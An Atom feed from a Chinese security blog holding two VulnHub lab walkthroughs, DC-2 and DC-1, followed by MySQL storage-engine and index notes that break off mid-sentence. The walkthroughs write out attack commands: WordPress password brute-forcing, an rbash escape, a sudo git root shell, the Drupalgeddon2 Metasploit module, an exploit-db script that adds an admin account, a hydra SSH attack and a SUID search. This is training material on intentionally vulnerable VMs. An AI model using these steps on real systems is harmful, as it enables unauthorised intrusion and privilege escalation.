<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Extraderの博客</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.extrader.top/"/>
  <updated>2021-05-02T14:02:11.614Z</updated>
  <id>https://www.extrader.top/</id>
  
  <author>
    <name>Extrader</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>VulnHub-DC-2</title>
    <link href="https://www.extrader.top/posts/ce8eed56/"/>
    <id>https://www.extrader.top/posts/ce8eed56/</id>
    <published>2021-05-02T13:45:30.000Z</published>
    <updated>2021-05-02T14:02:11.614Z</updated>
    
    <content type="html"><![CDATA[<p>靶机地址：192.168.99.150（DC-2）<a href="https://www.vulnhub.com/entry/dc-2,311/">链接</a></p><p>渗透机：192.168.99.188（Kali）</p><p>物理主机：192.168.99.107（Windows10）</p><p>目标：尽可能拿到更多的flag，有5个</p><p>nmap主机发现：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-2/image-20210502172127928.png" alt loading="lazy"></p><p>访问80端口，发现是一个WordPress站点，首页有flag1，如下</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-2/image-20210502172310497.png" alt loading="lazy"></p><p>似乎是让我们对用户进行爆破，但常规的密码字典里可能没有我们所需要的密码，于是采用<code>Cewl</code>进行密码信息搜集</p><pre class="language-none"><code class="language-none">cewl http:&#x2F;&#x2F;dc-2&#x2F; -m 3 -d 3 -e -v -w wppass.txt-m 最小单词长度-d：爬网深度-e：收集包含email地址信息-v：Verbose模式，该模式下，Cewl会导出目标网站的详细数据-w：保存字典文件</code></pre><p>得到字典后使用wpscan对网站后台进行扫描测试</p><pre class="language-none"><code class="language-none">wpscan --url http:&#x2F;&#x2F;dc-2&#x2F; -e u -P &#x2F;home&#x2F;kali&#x2F;msf_exp&#x2F;wppass.txt-e: 枚举 u表示枚举用户-P: 爆破密码字典路径</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-2/image-20210502173058881.png" alt loading="lazy"></p><p>拿到两个用户的用户名和密码</p><pre class="language-none"><code class="language-none">Username: jerry, Password: adipiscingUsername: tom, Password: parturient</code></pre><p>登录后台，在page里拿到flag2</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-2/image-20210502173751322.png" alt loading="lazy"></p><p>找其它的切入点，前面nmap在0-1000的端口中只扫到了一个80端口，加大力度，改成0-10000</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-2/image-20210502174409458.png" alt loading="lazy"></p><p>扫到一个7744的ssh端口，tom用户连上使用wp的后台密码即可登录，jerry不行，可能不是这个密码，也可能jerry不允许ssh登录</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-2/image-20210502174816845.png" alt loading="lazy"></p><p>登录目录下找到flag3，less查看</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-2/image-20210502174852430.png" alt loading="lazy"></p><p>随后尝试很多命令用不了，当前目录下的usr目录也进不去，查看当前目录下所有文件，查看<code>.bash_history</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-2/image-20210502175516495.png" alt loading="lazy"></p><p><code>ls -al usr/bin</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-2/image-20210502175312778.png" alt loading="lazy"></p><p>有四个命令可以用，并且使用的是rbash，一个功能受限的bash，限制性可能会有如下</p><ul><li>使用命令cd更改目录</li><li>设置或者取消环境变量的设置（SHELL, PATH, ENV, or BASH_ENV）</li><li>指定包含参数<code>&#39;/&#39;</code>的文件名</li><li>指定包含参数<code>&#39; - &#39;</code>的文件名</li><li>使用重定向输出<code>&#39;&gt;&#39;, &#39;&gt;&gt;&#39;, &#39;&gt; |&#39;, &#39;&lt;&gt;&#39; &#39;&gt;&amp;&#39;,&#39;&amp;&gt;&#39;</code></li></ul><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-2/image-20210502193832294.png" alt loading="lazy"></p><p>使用scp绕过</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-2/image-20210502193742568.png" alt loading="lazy"></p><p>还可以这样</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-2/image-20210502200235932.png" alt loading="lazy"></p><p>也可以用vi，方法不唯一，搬张图，可参考文末的链接</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-2/image-20210502200311594.png" alt loading="lazy"></p><p>在jerry的用户目录下找到<code>flag4.txt</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-2/image-20210502200512732.png" alt loading="lazy"></p><p><code>you&#39;re on your own now.  :-)</code>，线索<code>git</code></p><p>配置当前shell环境变量</p><pre class="language-none"><code class="language-none">export PATH&#x3D;$PATH:&#x2F;bin&#x2F;export PATH&#x3D;$PATH:&#x2F;usr&#x2F;bin</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-2/image-20210502211021164.png" alt loading="lazy"></p><p>大部分命令可用了</p><p>根据flag3的提示，su切换到jerry，密码就是上面的密码，<code>sudo -l</code>看看用户可以用sudo运行一些命令</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-2/image-20210502213404125.png" alt loading="lazy"></p><p>git可用，git提权</p><pre class="language-none"><code class="language-none">sudo git help config  在末行命令模式输入 !&#x2F;bin&#x2F;bash 或 !&#39;sh&#39;</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-2/image-20210502213732806.png" alt loading="lazy"></p><p>成功拿到最后的flag    </p><p><strong>参考：</strong></p><ul><li><a href="https://cloud.tencent.com/developer/article/1680551">RBash - 受限的Bash绕过</a></li><li><a href="https://www.const27.com/2021/03/12/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/">Linux 提权总结</a></li><li><a href="https://www.secpulse.com/archives/72965.html">利用通配符实现Linux本地提权</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;靶机地址：192.168.99.150（DC-2）&lt;a href=&quot;https://www.vulnhub.com/entry/dc-2,311/&quot;&gt;链接&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;渗透机：192.168.99.188（Kali）&lt;/p&gt;
&lt;p&gt;物理主机：192.168.99.
      
    
    </summary>
    
    
      <category term="渗透" scheme="https://www.extrader.top/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="靶机" scheme="https://www.extrader.top/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>VulnHub-DC-1</title>
    <link href="https://www.extrader.top/posts/5787bcec/"/>
    <id>https://www.extrader.top/posts/5787bcec/</id>
    <published>2021-05-01T13:20:30.000Z</published>
    <updated>2021-05-01T13:35:46.059Z</updated>
    
    <content type="html"><![CDATA[<p>靶机使用VMware搭建，网络为桥接模式，也可使用NAT模式</p><p>操作不难，主要学思路和方法，老是看别人渗透操作感觉我上我也行，但实际上自己真正的来操作了就知道了，越到后面就越不知道从何入手。。。</p><p>靶机：192.168.99.170（DC-1），<a href="https://www.vulnhub.com/entry/dc-1,292/">vulnhub地址</a></p><p>渗透机：192.168.99.188（Kali）</p><p>物理主机：192.168.99.107（Windows10）</p><p>目标：尽可能拿到更多的flag</p><p>nmap主机发现：</p><pre class="language-shell" data-language="shell"><code class="language-shell">nmap -sP -PR 192.168.99.1&#x2F;24-sP: Ping Scan - go no further than determining if host is online-PR: ARP Ping</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501114628048.png" alt loading="lazy"></p><p>找到靶机地址，对靶机端口进行扫描：</p><pre class="language-shell" data-language="shell"><code class="language-shell">sudo nmap -T4 -A -sN 192.168.99.170-sN: TCP Null, FIN, and Xmas scans-A: Enables OS detection and Version detection</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501115129119.png" alt loading="lazy"></p><p>查看80端口有http服务开放，打开发现是一个Drupal站点，版本为Drupal 7，网上搜有18年的代码执行漏洞（CVE-2018-7600）</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501155026635.png" alt loading="lazy"></p><p>上msf，<code>search drupal</code>，用18年的</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501155618792.png" alt loading="lazy"></p><pre class="language-shell" data-language="shell"><code class="language-shell">use exploit&#x2F;unix&#x2F;webapp&#x2F;drupal_drupalgeddon2set RHOSTS 192.169.99.170exploit</code></pre><p>成功弹回一个shell</p><p>查看系统信息<code>sysinfo</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501164905497.png" alt loading="lazy"></p><p>进入系统shell，查看当前用户为www-data</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501165519887.png" alt loading="lazy"></p><p>搜集信息</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501161345481.png" alt loading="lazy"></p><p>拿到flag1，<code>Every good CMS needs a config file - and so do you.</code>，根据提示找配置文件</p><p><code>search -f setting*</code> 或<code>find . -type f | xargs grep &quot;password&quot;</code>找setting开头的文件</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501163530112.png" alt loading="lazy"></p><p><code>download ./sites/default/settings.php /home/kali/</code>下载下来看看</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501163755265.png" alt loading="lazy"></p><p>拿到flag2，数据库用户账号密码</p><pre class="language-none"><code class="language-none">dictionary attacks aren&#39;t theonly ways to gain access (and you WILL need access).What can you do with these credentials?&#39;username&#39; &#x3D;&gt; &#39;dbuser&#39;,&#39;password&#39; &#x3D;&gt; &#39;R0ck3t&#39;,</code></pre><p><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code>进入一个交互式的shell，为什么要用交互式shell，因为非交互shell无回显，<a href="https://blog.csdn.net/gui951753/article/details/79154496">详见</a></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501165847912.png" alt loading="lazy"></p><p><code>mysql -udbuser -pR0ck3t</code>登录<code>mysql</code>命令行</p><p><code>select * from users \G;</code> </p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501202239805.png" alt loading="lazy"></p><p>admin密码加密的，这里有两个方法可以拿到后台管理员的账号</p><p>一个是把数据库中admin的密码给改成我们想要的密码，前提是要经过<code>Drupal</code>后端加密的才行</p><p>在网站根目录<code>scripts</code>找到加密脚本，<a href="http://drupalchina.cn/node/2128">参考</a></p><p>执行加密脚本<code>php scripts/password-hash.sh 123456</code>，得到<code>123456</code>加密后的密码<code>$S$DO3Rg8SH1xaO3lXuF8sKc8905t0xwoMMO80Ikju//Ia1JwdtrWz5</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501202852481.png" alt loading="lazy"></p><p>在数据库中<code>update</code>管理员的密码，即可用更改后的密码登录</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501203540144.png" alt loading="lazy"></p><p>还有一种方法，<code>searchsploit drupal</code>发现<code>Drupal 7.0 &lt; 7.31</code>版本存在SQL注入，可以直接添加管理员账号，<a href="https://www.exploit-db.com/exploits/34992">详见</a></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501204048208.png" alt loading="lazy"></p><p><code>python 34992.py -t http://192.168.99.170 -u extrader -p 123456</code> 即可添加管理员用户</p><p>登录后台</p><p>content里找到flag3</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501204137968.png" alt loading="lazy"></p><p>暗示<code>shadow</code>，<code>cat /etc/passwd</code>，发现flag4用户</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501204348304.png" alt loading="lazy"></p><p>在<code>/home/flag4</code>目录下找到<code>flag4.txt</code>文件</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501162541392.png" alt loading="lazy"></p><p>这里还可以用<code>hydra</code>爆破flag4的密码，虽然没啥用，学操作就够了</p><pre class="language-none"><code class="language-none">-l 指定用户名-P 加载密码字典（自定义)ssh:&#x2F;&#x2F;ip 指定使用协议和ip地址</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501210421392.png" alt loading="lazy"></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501210913760.png" alt loading="lazy"></p><pre class="language-none"><code class="language-none">Can you use this same method to find or access the flag in root?Probably. But perhaps it&#39;s not that easy.  Or maybe it is?</code></pre><p>意思要我们提权</p><p>suid提权</p><p><code>find / -perm -u=s -type f 2&gt;/dev/null</code>找到一个属于root的有s权限的文件</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501205439109.png" alt loading="lazy"></p><p>提权，在<code>/root</code>目录下拿到最终的flag</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501205503876.png" alt loading="lazy"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;靶机使用VMware搭建，网络为桥接模式，也可使用NAT模式&lt;/p&gt;
&lt;p&gt;操作不难，主要学思路和方法，老是看别人渗透操作感觉我上我也行，但实际上自己真正的来操作了就知道了，越到后面就越不知道从何入手。。。&lt;/p&gt;
&lt;p&gt;靶机：192.168.99.170（DC-1），&lt;a
      
    
    </summary>
    
    
      <category term="渗透" scheme="https://www.extrader.top/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="靶机" scheme="https://www.extrader.top/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>MySQL学习笔记</title>
    <link href="https://www.extrader.top/posts/f12cbde5/"/>
    <id>https://www.extrader.top/posts/f12cbde5/</id>
    <published>2021-04-09T05:17:01.000Z</published>
    <updated>2021-04-10T12:08:09.609Z</updated>
    
    <content type="html"><![CDATA[<h3 id="MySQL存储引擎"><a href="#MySQL存储引擎" class="headerlink" title="MySQL存储引擎"></a>MySQL存储引擎</h3><p>存储引擎是MySQL组件，用于处理不同类型的SQL操作。</p><p>使用 <a href="https://dev.mysql.com/doc/refman/5.7/en/show-engines.html"><code>SHOW ENGINES</code></a> 语句查看服务器支持哪些存储引擎，Support列中表示是否可以使用，DEFAULT表示默认值。（下图版本为MySQL 5.7.26，Windows 10）</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/MySQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210409135417092.png" alt loading="lazy"></p><p><a href="https://dev.mysql.com/doc/refman/5.7/en/innodb-storage-engine.html"><code>InnoDB</code></a> 是默认的且用途最广的存储引擎，Oracle官方建议将其用于表（特殊用例除外）。（默认情况下 ，MySQL 5.7 or MySQL 8.0 中使用  <a href="https://dev.mysql.com/doc/refman/5.7/en/create-table.html"><code>CREATE TABLE</code></a> 语句创建<code>InnoDB</code>表。）</p><h4 id="InnoDB"><a href="#InnoDB" class="headerlink" title="InnoDB"></a>InnoDB</h4><p>事务型数据库的首选引擎，支持事务安全（ACID），具有提交（COMMIT），回滚（ROLLBACK）和奔溃恢复（crash-recovery）功能 <a href="https://dev.mysql.com/doc/refman/5.7/en/mysql-acid.html">InnoDB and the ACID Model</a></p><p>行级锁定和Oracle风格的一致读取可提高多用户的并发性和性能 <a href="https://dev.mysql.com/doc/refman/5.7/en/innodb-locking-transaction-model.html">InnoDB Locking and Transaction Model</a></p><p>InnoDB将数据存放在磁盘上，以基于主键优化查询，每个InnoDB表都有一个称为聚集索引（The Clustered Index）的主键索引，该索引组织数据以最小化主键查找<code>I/O</code> <a href="https://dev.mysql.com/doc/refman/5.7/en/innodb-index-types.html">Clustered and Secondary Indexes</a></p><p>为了保持数据的完整性，InnoDB支持 <code>FOREIGN KEY</code> 约束，使用外键检查插入，更新和删除，以确保它们不会导致相关表之间的不一致。 <a href="https://dev.mysql.com/doc/refman/5.7/en/create-table-foreign-keys.html">FOREIGN KEY Constraints</a></p><p><strong>ACID</strong></p><ul><li><p>原子性（Atomicity）</p><p>一个事务要么全部提交成功，要么全部回滚失败，不能只执行其中的一部分操作</p></li><li><p>一致性（Consistency）</p><p>事务的执行不能破坏数据库的完整性和一致性，在一个事务在执行前后，数据库都必须处于一致性状态，以防止数据崩溃</p></li><li><p>隔离性（Isolation）</p><p>在并发的环境中，并发事务是相互隔离的，并发执行的事务直接不能互相干扰</p></li><li><p>持久性（Durability）</p><p>一旦事务提交，则对应数据库中的数据状态的变更就会永久的保存到数据库中</p></li></ul><p>一般来说，如果需要事务支持，并且有较高的并发读取频率，InnoDB首选</p><h4 id="MyISAM"><a href="#MyISAM" class="headerlink" title="MyISAM"></a>MyISAM</h4><p>所有数据值首先存储在低字节中（The Low Byte First），这使得MyISAM独立于操作系统，可以轻松地将其从Windows服务器移植到Linux服务器</p><p>每个<code>MyISAM</code>表都以三个文件存储在磁盘上。这些文件具有以表名开头的名称，并具有用于指示文件类型的扩展名，<code>.frm</code> 文件存储表格式，<code>.MYD</code>（MYData）文件存储数据，<code>.MYI</code>（MYIndex）存储索引</p><p>支持并发插入，即适合在插入密集型表中使用，例如管理邮件或Web服务器日志数据</p><p>MyISAM存储引擎在筛选大量数据时非常迅速，适合插入密集型表</p><h4 id="Memory"><a href="#Memory" class="headerlink" title="Memory"></a>Memory</h4><p>将所有数据存储在RAM中，以便在需要快速查找非关键数据的环境中进行快速访问，当mysqld守护进程崩溃时，所有的Memory数据都会丢失。</p><p>要求存储在Memory数据表里的数据使用的是长度不变的格式，不支持可变长度数据类型（包括BLOB和TEXT），VARCHAR是一种长度可变的类型，但因为它在MySQL内部当做长度固定不变的CHAR类型，所以可以使用。</p><p>一般在目标数据较小，而且访问非常频繁适合使用，造成内存的使用可以通过参数<code>max_help_table_size</code>控制<code>Memory</code>表的大小，如果数据是临时的，而且要求必须被立即使用，就可以存放在内存表之中，若数据丢失，不会对应用服务产生实质的负面影响，Memory同时支持散列索引和B数索引。</p><h4 id="CSV"><a href="#CSV" class="headerlink" title="CSV"></a>CSV</h4><p>实际上是带有逗号分隔符的文本文件，CVS表允许以CSV格式导入或转储数据，以便与读取和写入相同格式的脚本和应用程序交换数据。</p><p>CSV 存储引擎因为自身文件格式的原因，所有列必须强制指定 NOT NULL 。</p><p>CSV 存储引擎也会包含一个存储表结构的 .frm 文件，还会创建一个 .csv 存储数据的文件，还会创建一个同名的元信息文件，该文件的扩展名为 .CSM ，用来保存表的状态及表中保存的数据量。每个数据行占用一个文本行。</p><h4 id="ARCHIVE"><a href="#ARCHIVE" class="headerlink" title="ARCHIVE"></a>ARCHIVE</h4><p>归档，仅支持最基本的插入和查询两种功能，MySQL 5.5以后的版本中开始支持索引，Archive拥有很好的压缩机制，它使用zlib压缩库，在记录被请求时会实时压缩，所以它经常被用来当做仓库使用。</p><h4 id="BLACKHOLE"><a href="#BLACKHOLE" class="headerlink" title="BLACKHOLE"></a>BLACKHOLE</h4><p>黑洞存储引擎，所有插入的数据并不会保存，BLACKHOLE 引擎表永远保持为空，写入的任何数据都会消失。</p><h3 id="InnoDB底层原理"><a href="#InnoDB底层原理" class="headerlink" title="InnoDB底层原理"></a>InnoDB底层原理</h3><p>架构图：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/MySQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210409171932233.png" alt loading="lazy"></p><h4 id="Buffer-Pool"><a href="#Buffer-Pool" class="headerlink" title="Buffer Pool"></a>Buffer Pool</h4><p><a href="https://dev.mysql.com/doc/refman/8.0/en/innodb-buffer-pool.html">缓冲池</a></p><p>InnoDB为了做数据的持久化，会将数据存储到磁盘上。但是面对大量的请求时，CPU的处理速度和磁盘的IO速度之间差距太大，为了提高整体的效率， InnoDB引入了<strong>缓冲池</strong>。</p><p>缓冲池是内存中的一个区域，在InnoDB访问表和索引数据的时候会在其中进行高速缓存，缓冲池允许直接从内存访问经常使用的数据，从而加快了处理速度。在专用服务器上，通常将多达80％的物理内存分配给缓冲池。</p><p>为了提高大容量读取操作的效率，缓冲池被划分为多个页面，这些页面可以潜在地容纳多行，为了提高缓存管理的效率，使用最近最少使用（LRU）算法的变体，将很少使用的数据从缓存中老化掉。</p><p>如何利用缓冲池将经常访问的数据保留在内存中是MySQL调优的重要方面。</p><h4 id="Buffer-Pool-LRU-Algorithm"><a href="#Buffer-Pool-LRU-Algorithm" class="headerlink" title="Buffer Pool LRU Algorithm"></a>Buffer Pool LRU Algorithm</h4><p><a href="https://dev.mysql.com/doc/refman/8.0/en/innodb-buffer-pool.html">缓冲池LRU算法</a></p><p>缓冲池使用LRU算法的变体作为列表进行管理。当需要空间以将新页面添加到缓冲池时，将驱逐最近使用最少的页面，并将新页面添加到列表的中间。此中点插入策略将列表视为两个子列表：</p><ul><li><p>最前面是最近访问过的新页面（“年轻”） 的子列表</p></li><li><p>在末尾，是最近访问过的旧页面的子列表</p></li></ul><p>官方结构图如下：</p><p><img src="https://dev.mysql.com/doc/refman/8.0/en/images/innodb-buffer-pool-list.png" alt loading="lazy"></p><ul><li>3/8的缓存池专用于旧的子列表</li><li>列表中点是新子列表的尾部与旧子列表的头部相交的界面</li><li>当InnoDB将页面读入缓冲池时，首先插入中点</li><li>访问旧子列表中的页面会使得其变为”年轻“，然后移至新子列表的开头</li><li>随着数据库的运行，通过移至列表的末尾，缓冲池中未访问的页面将“老化”，新的和旧的子列表中的页面都会随着其他页面的更新而老化，随着在中点插入页面，旧子列表中的页面也会老化。最终，未使用的页面到达旧子列表的尾部并被逐出。</li></ul><h4 id="Change-Buffer"><a href="#Change-Buffer" class="headerlink" title="Change Buffer"></a>Change Buffer</h4><p><a href="https://dev.mysql.com/doc/refman/8.0/en/innodb-change-buffer.html">插入缓冲</a></p><p>插入缓冲针对的操作是更新或者插入，我们考虑最坏的情况，那就是需要更新的数据都不在缓冲池中。那么此时等数据达到某个阈值（例如50条）才批量的写入磁盘</p><p><img src="https://dev.mysql.com/doc/refman/8.0/en/images/innodb-change-buffer.png" alt loading="lazy"></p><p><a href="https://dev.mysql.com/doc/refman/8.0/en/innodb-parameters.html#sysvar_innodb_change_buffering"><code>innodb_change_buffering</code></a> 变量控制<code>InnoDB</code> 执行更改缓冲的程度，默认值为all。</p><ul><li><p><strong><code>all</code></strong></p><p>默认值：缓冲区插入，删除标记操作和清除。</p></li><li><p><strong><code>none</code></strong></p><p>不要缓冲任何操作。</p></li><li><p><strong><code>inserts</code></strong></p><p>缓冲区插入操作。</p></li><li><p><strong><code>deletes</code></strong></p><p>缓冲区删除标记操作。</p></li><li><p><strong><code>changes</code></strong></p><p>缓冲插入和删除标记操作。</p></li><li><p><strong><code>purges</code></strong></p><p>缓冲在后台发生的物理删除操作。</p></li></ul><p><a href="https://dev.mysql.com/doc/refman/8.0/en/innodb-parameters.html#sysvar_innodb_change_buffer_max_size"><code>innodb_change_buffer_max_size</code></a> 变量允许将更改缓冲区的最大大小配置为缓冲池总大小的百分比。默认情况下， <code>innodb_change_buffer_max_size</code>设置为25。最大设置为50。</p><h4 id="Log-Buffer"><a href="#Log-Buffer" class="headerlink" title="Log Buffer"></a>Log Buffer</h4><p><a href="https://dev.mysql.com/doc/refman/8.0/en/innodb-redo-log-buffer.html">日志缓冲</a></p><p>日志缓冲区是存储区域，用于保存要写入磁盘上的日志文件的数据。日志缓冲区大小由<a href="https://dev.mysql.com/doc/refman/8.0/en/innodb-parameters.html#sysvar_innodb_log_buffer_size"><code>innodb_log_buffer_size</code></a>变量定义 。默认大小为16MB。日志缓冲区的内容会定期刷新到磁盘。较大的日志缓冲区使大型事务可以运行，而无需在事务提交之前将重做日志数据写入磁盘。因此，如果有更新，插入或删除许多行的事务，则增加日志缓冲区的大小可以节省磁盘I/O。</p><h4 id="Adaptive-Hash-Index"><a href="#Adaptive-Hash-Index" class="headerlink" title="Adaptive Hash Index"></a>Adaptive Hash Index</h4><p><a href="https://dev.mysql.com/doc/refman/8.0/en/innodb-adaptive-hash.html">自适应哈希索引</a></p><p>自适应索引就跟JVM在运行过程中，会动态的把某些热点代码编译成Machine Code一样，InnoDB会监控对所有索引的查询，对热点访问的页建立哈希索引，以此来提升访问速度。</p><h4 id="Doublewrite-Buffer"><a href="#Doublewrite-Buffer" class="headerlink" title="Doublewrite Buffer"></a>Doublewrite Buffer</h4><p><a href="https://dev.mysql.com/doc/refman/8.0/en/innodb-doublewrite-buffer.html">双写缓冲区</a></p><p><strong>插入缓冲</strong>提高了MySQL的性能，而<strong>两次写</strong>则在此基础上提高了数据的可靠性。当数据还在缓冲池中的时候，当机器宕机了，发生了<strong>写失效</strong>，有Redo Log来进行恢复。但是如果是在从缓冲池中将数据刷回磁盘的时候宕机了呢？</p><p>这种情况叫做部分写失效，此时重做日志就无法解决问题。</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/MySQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210409163524052.png" alt loading="lazy"></p><p>在刷脏页时，并不是直接刷入磁盘，而是copy到内存中的Doublewrite Buffer中，然后再拷贝至磁盘共享表空间（你可以就理解为磁盘）中，每次写入1M，等copy完成后，再将Doublewrite Buffer中的页写入磁盘文件。</p><p>有了两次写机制，即使在刷脏页时宕机了，在实例恢复的时候也可以从共享表空间中找到Doublewrite Buffer的页副本，直接将其覆盖原来的数据页即可。</p><p>尽管数据被写入两次，但双写缓冲区不需要两倍的I / O开销或两倍的I / O操作。只需一次<code>fsync()</code>调用操作系统即可将数据按较大的顺序块写入doublewrite缓冲区（除非 <code>innodb_flush_method</code>设置为 <code>O_DIRECT_NO_FSYNC</code>）。</p><p>在MySQL 8.0.20之前，doublewrite缓冲区存储区位于<code>InnoDB</code>系统表空间中。从MySQL 8.0.20开始，doublewrite缓冲区存储区位于doublewrite文件中。</p><h4 id="Redo-Log"><a href="#Redo-Log" class="headerlink" title="Redo Log"></a>Redo Log</h4><p><a href="https://dev.mysql.com/doc/refman/8.0/en/innodb-redo-log.html">重做日志</a></p><p>用于记录事务操作的变化，且记录的是修改之后的值。</p><p>不管事务是否提交都会记录下来。例如在更新数据时，会先将更新的记录写到Redo Log中，再更新缓存中页中的数据。然后按照设置的更新策略，将内存中的数据刷回磁盘。</p><h4 id="Undo-Log"><a href="#Undo-Log" class="headerlink" title="Undo Log"></a>Undo Log</h4><p><a href="https://dev.mysql.com/doc/refman/8.0/en/innodb-undo-logs.html">撤消日志</a></p><p>记录事务开始之前的一个版本，可用于事务失败之后发生的回滚。</p><h3 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h3><p>MySQL索引的建立对于MySQL的高效运行是很重要的，索引可以大大提高MySQL的检索速度。</p><p>拿汉语字典的目录页（索引）打比方，我们可以按拼音、笔画、偏旁部首等排序的目录（索引）快速查找到需要的字。</p><p>创建索引时，你需要确保该索引是应用在 SQL 查询语句的条件(一般作为 WHERE 子句的条件)。</p><p>实际上，索引也是一张表，该表保存了主键与索引字段，并指向实体表的记录。</p><p>过多的使用索引将会造成滥用。因此索引也会有它的缺点：虽然索引大大提高了查询速度，同时却会降低更新表的速度，如对表进行INSERT、UPDATE和DELETE。因为更新表时，MySQL不仅要保存数据，还要保存一下索引文件。建立索引会占用磁盘空间的索引文件。</p><p>索引分为：</p><ol><li><p>主键索引</p><p>primary key() 要求关键字不能重复，也不能为null,同时增加主键约束</p><p>主键索引定义时，不能命名</p></li><li><p>唯一索引</p><p>unique index() 要求关键字不能重复，同时增加唯一约束</p></li><li><p>普通索引</p><p>index() 对关键字没有要求</p></li><li><p>全文索引</p><p>fulltext key() 关键字的来源不是所有字段的数据，而是字段中提取的特别关键字</p></li></ol><p>先了解一下索引的数据结构 B-Tree（MySQL主要使用 B-tree 平衡树）</p><h4 id="B树"><a href="#B树" class="headerlink" title="B树"></a>B树</h4><p>B树也称B-树,它是一颗多路平衡查找树。大致结构如下</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/MySQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210410153354423.png" alt loading="lazy"></p><p>B树的阶为节点的最多的子节点数</p><p>B数的搜索方式从根节点开始，对节点内的关键字（有序）序列进行二分查找，如果命中则结束，否则进入查询关键字所属范围的儿子节点，叶子节点和非叶子节点都存放数据，搜索有可能在非叶子节点结束。</p><h4 id="B-树"><a href="#B-树" class="headerlink" title="B+树"></a>B+树</h4><p>B+ 树是 B 树的变体，也是一种多路搜索树。</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/MySQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210410154531450.png" alt loading="lazy"></p><p>B+树只有到达叶子节点才命中，即所有关键字都出现在叶子节点链表中</p><ul><li>数据只能在叶子节点，也叫 <strong>稠密索引</strong>，且链表中的关键字（数据）恰好是有序的。</li></ul><p>非叶子节点相当于是叶子节点的索引，也叫 